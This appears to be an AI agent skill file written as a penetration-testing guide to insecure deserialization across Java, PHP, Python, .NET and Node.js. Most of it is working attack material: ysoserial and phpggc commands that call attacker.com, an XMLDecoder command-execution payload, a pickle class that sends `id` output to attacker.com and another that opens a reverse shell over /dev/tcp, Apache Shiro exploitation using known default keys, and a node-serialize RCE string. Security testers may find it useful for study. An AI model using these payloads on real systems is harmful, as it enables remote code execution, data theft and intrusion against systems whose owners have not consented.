---
name: insecure-deserialization-advanced
description: Advanced deserialization attacks — Java gadget chains, Python pickle RCE, PHP object injection, and .NET viewstate
---

# Insecure Deserialization (Advanced)

Building on basic deserialization concepts, this covers language-specific gadget chains, tool usage, finding deserialization surfaces, and chaining deserialization to RCE. Each language/platform has unique characteristics and established exploitation patterns.

## Java Deserialization

### Detection Signatures

```
# HTTP request with Java deserialized data:
Content-Type: application/x-java-serialized-object
# Or base64-encoded in cookie/header/body

# Java serialized data magic bytes:
AC ED 00 05  (hex)
rO0AB        (base64 prefix)

# Check for these in:
# Cookie values
# POST body parameters
# Custom HTTP headers
# Viewstate alternatives
```

### Common Entry Points

```
# Cookie: JSESSIONID or custom session cookie
# Cookie: rememberMe (Apache Shiro)
# Cookie: SPRING_SECURITY_REMEMBER_ME_COOKIE
# AMF (Adobe Flex/AMF format)
# JMX/RMI endpoints
# WebLogic T3/IIOP protocol
# JBoss HTTP invoker: /invoker/JMXInvokerServlet
# XMLDecoder (used in various frameworks)
```

### Tool: ysoserial

```bash
# Generate payloads for known gadget chains
java -jar ysoserial.jar CommonsCollections1 'curl http://attacker.com/$(whoami)'
java -jar ysoserial.jar CommonsCollections3 'curl http://attacker.com'
java -jar ysoserial.jar Spring1 'ping attacker.com'
java -jar ysoserial.jar Groovy1 'calc.exe'

# Common gadget chains by library:
# CommonsCollections1-7 → Apache Commons Collections
# Spring1/2 → Spring Framework
# Hibernate1/2 → Hibernate ORM
# Groovy1 → Groovy
# ROME → ROME RSS library
# JRMPClient → Java RMI

# Encoding for HTTP:
java -jar ysoserial.jar CommonsCollections1 'curl http://attacker.com' | base64 -w0

# For blind detection (DNS OAST):
java -jar ysoserial.jar CommonsCollections1 'nslookup attacker.com' | base64 -w0
```

### Apache Shiro (CVE-2016-4437 and related)

```
# Shiro uses CBC+PKCS5 padding with hardcoded key "kPH+bIxk5D2deZiIxcaaaA=="
# Default key allows forging any cookie value

# Tool: shiro-exploit
python3 shiro-exploit.py -u https://target.com -k kPH+bIxk5D2deZiIxcaaaA== -c 'id'

# Detection: rememberMe=X in cookie, "deleteMe" in Set-Cookie response = deserialization attempt
curl -H "Cookie: rememberMe=x" https://target.com -v | grep -i "set-cookie: rememberMe=deleteMe"

# Common keys to test:
# kPH+bIxk5D2deZiIxcaaaA==
# 2AvVhdsgUs0FSA3SDFAdag==
# r0e3c16IdVkouznQqEm5UA==
```

### WebLogic (CVE-2019-2725, 2020-2555, etc.)

```
# T3 protocol deserialization
# Endpoint: :7001 (T3), :8001 (admin), :4848

# Detection:
nmap --script weblogic-t3-info -p 7001 target.com

# Tool: weblogic-framework
java -jar weblogic-framework.jar -ip target -port 7001 -cmd "id"
```

### XMLDecoder (CVE-2017-10271 / WebLogic XMLDECODER)

```xml
# Payload in POST body:
<java version="1.4.0" class="java.beans.XMLDecoder">
  <object class="java.lang.Runtime" method="exec">
    <array class="java.lang.String" length="3">
      <void index="0"><string>/bin/bash</string></void>
      <void index="1"><string>-c</string></void>
      <void index="2"><string>id>/tmp/x</string></void>
    </array>
  </object>
</java>
```

## PHP Object Injection

### Detection

```php
// Vulnerable code pattern:
$data = unserialize($_COOKIE['user']);
$obj = unserialize(base64_decode($_GET['data']));
$cache = unserialize(file_get_contents('cache.php'));
```

### PHP Serialization Format

```php
// Integer: i:1337;
// String: s:4:"test";
// Boolean: b:1;
// Null: N;
// Array: a:2:{i:0;s:1:"a";i:1;s:1:"b";}
// Object: O:4:"User":2:{s:4:"name";s:5:"admin";s:5:"admin";b:1;}

// Craft admin object:
O:4:"User":2:{s:4:"name";s:5:"admin";s:5:"admin";b:1;}
// base64: TzQ6IlVzZXIiOjI6e3M6NDoibmFtZSI7czo1OiJhZG1pbiI7czo1OiJhZG1pbiI7YjoxO30=
```

### PHP Magic Methods (Gadget Entry Points)

```php
__wakeup()  → called on unserialize
__destruct() → called on object destruction
__toString() → called on string conversion
__call()    → called on undefined method
__get()     → called on undefined property
__invoke()  → called when object used as function
```

### Tool: phpggc

```bash
# Generate PHP gadget chains
phpggc Laravel/RCE1 system id
phpggc Symfony/RCE4 exec id
phpggc Magento/RCE3 exec id
phpggc WordPress/RCE1 exec 'curl http://attacker.com'
phpggc Yii/RCE1 system 'curl http://attacker.com'

# List available chains
phpggc -l

# Output formats
phpggc -b Laravel/RCE1 system id  # base64
phpggc --url-encode Laravel/RCE1 system id  # URL encoded
```

## Python Pickle

### RCE Payload

```python
import pickle, os, base64

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/?x=$(id|base64)',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)

# Or with more complex command:
class RCE:
    def __reduce__(self):
        cmd = 'bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"'
        return (os.system, (cmd,))
```

### Detection

```
# Python pickle data starts with bytes:
b'\x80\x04'  or  b'\x80\x02'  (pickle protocol 4 or 2)
# Base64: gASV... or gAJ...

# Endpoints:
# Flask sessions (if using non-JSON serialization)
# Custom caching mechanisms
# ML model loading (PyTorch .pt, sklearn pickle)
# Celery task queues
```

## .NET ViewState

```bash
# ViewState without MAC validation → object injection
# With known MAC key → forge ViewState

# Tool: ysoserial.net
ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd /c whoami" --path="/page.aspx" --apppath="/"
ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c "cmd /c whoami"

# Detection:
# __VIEWSTATE parameter in ASP.NET forms
# Check if MAC validation enabled: try modifying ViewState → if accepted → no validation

# Also test:
# __EVENTTARGET
# __EVENTVALIDATION
# LosFormatter cookies
```

## Node.js Deserialization

```javascript
// Unsafe unserialize with node-serialize:
var serialize = require('node-serialize');
var payload = '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\', function(error, stdout, stderr){ console.log(stdout) });}()"}';
serialize.unserialize(payload);

// Detection: JSON with _$$ND_FUNC$$_ prefix
// Cookie values starting with: {"...":"_$$ND_FUNC$$_function()
```

## Testing Methodology

1. **Find serialized data** — Magic bytes, base64 blobs in cookies/params/headers/body
2. **Identify platform** — Java (rO0A), PHP (O:4:), Python (gAS), .NET (AAEAAAD)
3. **Test with gadget generator** — ysoserial/phpggc/pickle for known chains
4. **OAST first** — DNS callback to confirm deserialization without RCE risk
5. **Test all transport paths** — Cookie, GET params, POST body, custom headers, WebSockets
6. **Check for weak/default keys** — Shiro, Spring, .NET MachineKey

## Validation

1. Use OAST DNS callback as first proof (least disruptive)
2. Then progress to `id`/`whoami` via HTTP callback
3. Show the exact parameter/cookie where payload was injected
4. Identify which gadget chain was used and which library version required

## Pro Tips

1. `rO0AB` in any cookie = Java serialization = test all ysoserial chains
2. Shiro `rememberMe` is still found in production — always test for default key
3. phpggc chains work per framework — identify framework version first
4. Python ML endpoints loading models may use pickle — test model upload endpoints
5. .NET ViewState without MAC is automatic RCE if you can find the right gadget
6. Celery, Redis queues, and session stores may contain serialized data
7. Always test with DNS OAST first — you get confirmation without triggering a destructive payload

## Summary

Deserialization vulnerabilities are high-impact but require knowing the correct gadget chain for the target's library versions. Use magic byte detection to identify the serialization format, then gadget generators for the appropriate platform. Confirm via DNS OAST before escalating to command execution.
